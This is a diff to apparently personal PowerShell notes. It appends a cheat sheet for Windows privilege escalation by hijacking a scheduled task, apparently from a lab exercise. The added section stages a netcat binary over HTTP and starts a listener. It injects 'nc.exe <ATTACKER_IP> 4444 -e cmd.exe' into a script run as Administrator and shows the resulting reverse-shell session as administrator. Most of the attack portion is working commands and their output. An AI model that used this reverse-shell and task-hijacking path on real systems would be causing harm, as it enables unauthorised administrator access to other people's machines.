@@ -201,3 +201,54 @@ $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64St
 * **Version Compatibility**: Always validate using `$PSVersionTable.PSVersion`.
 * **Pipeline Integrity**: Use `Get-CimInstance` (modern) instead of `Get-WmiObject` (deprecated).
 * **Alias Usage**: Use full cmdlet names in scripts. Interactive aliases (e.g., `ls`, `curl`) should be reserved for interactive shell use to prevent unpredictable behavior.
+
+# 11. Cheat Sheet: Windows Privilege Escalation via Scheduled Task Hijacking
+
+This document outlines the complete exploitation path for escalating privileges by hijacking a vulnerable scheduled task. The scenario assumes Write access to a PowerShell script (`backupprep.ps1`) executed periodically by a high-privileged account (Administrator).
+
+## 1. Payload Staging (Attacker Machine)
+Locate a valid Windows PE (Portable Executable) Netcat binary to avoid OS platform mismatch errors. Host it via a temporary HTTP server for target retrieval.
+
+```bash
+# Locate the cross-compiled Windows binary on Kali Linux
+cd /usr/share/windows-resources/binaries/
+
+# Host the payload via HTTP
+python3 -m http.server 8080
+```
+
+## 2. Exploit Preparation (Attacker Machine)
+Initialize the reverse shell listener on the attacker machine before the scheduled task triggers on the target.
+
+```bash
+# Set up a Netcat listener on the designated port
+nc -lvnp 4444
+```
+
+## 3. Payload Transfer & Code Injection (Target Machine)
+Download the binary to a globally writable directory on the target environment (e.g., `C:\Temp`). Inject the execution command into the vulnerable scheduled script.
+
+```powershell
+# Append the payload execution to the vulnerable script.
+# The '-e cmd.exe' flag binds the Command Prompt to the TCP socket.
+echo "C:\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe" >> C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
+```
+*(Note: In live environments, it is recommended to execute the payload asynchronously using `Start-Process` to avoid hanging the Task Scheduler).*
+
+## 4. Exploitation & Verification
+Once the Task Scheduler executes the modified script, the reverse shell callback is received, granting interactive access under the context of the task owner.
+
+```cmd
+listening on [any] 4444 ...
+connect to [10.10.15.120] from (UNKNOWN) [10.129.73.207] 49687
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+win01\administrator
+```
+
+### ⚠️ Post-Exploitation Note (Shell Environment)
+Because the payload binds to `cmd.exe`, standard Linux or PowerShell aliases will not function. 
+* Use `dir` instead of `ls` to list directory contents.
+* Use `cd` (without arguments) instead of `pwd` to print the current working directory.
